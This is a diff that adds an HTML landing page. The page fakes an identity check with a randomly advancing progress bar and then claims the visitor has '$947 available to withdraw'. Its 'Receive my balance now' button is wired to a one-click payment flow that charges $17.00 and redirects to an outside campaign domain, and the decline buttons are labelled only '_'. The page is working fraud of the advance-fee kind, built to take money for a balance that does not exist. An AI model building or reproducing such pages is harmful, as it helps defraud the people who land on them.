@@ -1,0 +1,191 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Validation</title>
+
+<style>
+body {
+    margin:0;
+    font-family:-apple-system, Arial;
+    background:#f5f7fa;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+}
+
+.card {
+    width:100%;
+    max-width:380px;
+    background:#fff;
+    border-radius:18px;
+    padding:30px;
+    text-align:center;
+    box-shadow:0 15px 40px rgba(0,0,0,0.08);
+}
+
+.logo {
+    width:70px;
+    margin-bottom:10px;
+}
+
+.balance {
+    background:#ecfdf5;
+    color:#059669;
+    padding:12px;
+    border-radius:12px;
+    font-size:16px;
+    font-weight:bold;
+    margin-bottom:15px;
+}
+
+.icon {
+    font-size:42px;
+    margin-bottom:15px;
+}
+
+.title {
+    font-size:20px;
+    font-weight:bold;
+    margin-bottom:10px;
+}
+
+.text {
+    font-size:14px;
+    color:#555;
+    margin-bottom:20px;
+}
+
+.loader {
+    width:50px;
+    height:50px;
+    border:5px solid #eee;
+    border-top:5px solid #ff2d55;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin:20px auto;
+}
+
+.progress {
+    width:100%;
+    height:8px;
+    background:#eee;
+    border-radius:20px;
+    overflow:hidden;
+    margin-top:15px;
+}
+
+.bar {
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#ff2d55,#ff5c7a);
+}
+
+@keyframes spin {
+    0%{transform:rotate(0)}
+    100%{transform:rotate(360deg)}
+}
+
+.hidden {display:none;}
+
+.success {
+    color:#16a34a;
+    font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <!-- STEP 1 -->
+    <div id="step1">
+        <div class="icon">🔍</div>
+        <div class="title">Validating identity</div>
+        <div class="loader"></div>
+
+        <div class="progress">
+            <div class="bar" id="progressBar"></div>
+        </div>
+    </div>
+
+    <!-- STEP 2 -->
+    <div id="step2" class="hidden">
+        <div class="icon success">✔</div>
+        <div class="title">Verified</div>
+        <div class="text">You are a real person</div>
+    </div>
+
+    <!-- STEP 3 -->
+    <div id="step3" class="hidden">
+
+        <img class="logo" src="images/WltV7zlqEk4G.png">
+
+        <div class="balance">
+            $947 available to withdraw
+        </div>
+
+        <div class="icon">💰</div>
+        <div class="title">All set</div>
+
+        <div class="text">
+            Click the button below to complete your withdrawal.
+        </div>
+
+        <!-- BOTÃO NOVO (SEM ALTERAÇÃO) -->
+        <div style="display:flex;justify-content:center;margin-top:15px;">
+
+<div style="display:flex;flex-direction:column;gap:12px;width:fit-content;font-family:inherit;" data-cooud-flow-root="">
+  <script type="application/json">{"steps":[{"title":"Receive balance","priceText":"$17.00","primary":{"id":"01KMRDSQFX21GV2W96XC6CWJ9R","redirect":"https://campanhaspot.biz/up1/","label":"Receive my balance now","style":"display: flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 600; padding: 16px 24px; font-size: 17px; border-radius: 8px; background-color: #ff0040; color: #ffffff; border: none; width: 100%; cursor: pointer;"},"fallback":null,"dismiss":{"primary":{"label":"_","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;"},"fallback":{"label":"_","style":"display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;"}}}],"initialStep":0,"startInFallback":false,"processingText":"Processing...","noMoreOffersText":"Thank you! No more offers.","connectScriptUrl":"https://orbit.cooud.com/scripts/connect"}</script>
+  <button type="button" data-cooud-flow-primary="" data-connect-action="take" data-connect-id="01KMRDSQFX21GV2W96XC6CWJ9R" data-connect-redirect="https://campanhaspot.biz/up1/" style="display: flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 600; padding: 16px 24px; font-size: 17px; border-radius: 8px; background-color: #ff0040; color: #ffffff; border: none; width: 100%; cursor: pointer;">
+    Receive my balance now
+  </button>
+  <button type="button" data-cooud-flow-dismiss="" data-connect-action="dismiss" style="display: inline-flex; align-items: center; justify-content: center; text-decoration: none; font-family: inherit; font-weight: 400; padding: 12px 20px; font-size: 15px; border-radius: 8px; background-color: transparent; color: #6b7280; border: none;  cursor: pointer;">
+    _
+  </button>
+</div>
+
+<script src="https://js.stripe.com/v3/" async="" defer=""></script>
+<script src="https://orbit.cooud.com/scripts/flow" async="" defer=""></script>
+
+        </div>
+
+    </div>
+
+</div>
+
+<audio id="successSound" src="media/PusAe2qR6Jwz.mp3"></audio>
+
+<script>
+let progress = 0;
+const bar = document.getElementById("progressBar");
+
+let interval = setInterval(() => {
+    progress += Math.random() * 15;
+
+    if(progress >= 100){
+        progress = 100;
+        clearInterval(interval);
+
+        setTimeout(()=>{
+            document.getElementById("step1").classList.add("hidden");
+            document.getElementById("step2").classList.remove("hidden");
+
+            document.getElementById("successSound").play();
+
+            setTimeout(()=>{
+                document.getElementById("step2").classList.add("hidden");
+                document.getElementById("step3").classList.remove("hidden");
+            },1500);
+
+        },500);
+    }
+
+    bar.style.width = progress + "%";
+
+}, 400);
+</script>
+
+
+</body></html>
